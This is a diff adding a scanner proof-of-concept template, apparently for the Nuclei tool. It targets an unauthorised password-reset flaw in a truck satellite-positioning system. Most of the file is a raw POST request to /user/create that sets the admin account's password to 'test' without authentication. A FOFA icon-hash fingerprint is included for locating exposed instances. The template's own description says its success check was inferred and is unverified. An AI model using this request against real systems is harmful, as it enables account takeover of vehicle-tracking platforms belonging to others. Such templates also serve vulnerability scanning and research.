@@ -1,0 +1,40 @@
+id: poc-acd4sr0zce9109cs
+info:
+  name: 卡车卫星定位系统_user_create存在未授权密码重置漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/acd4sr0zce9109cs
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: acd4sr0zce9109cs
+    fofa: icon_hash="1553867732"
+http:
+- raw:
+  - 'POST /user/create HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    X-Requested-With: XMLHttpRequest
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+
+    account=admin&id=1&password=test&passwordRepeat=test&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
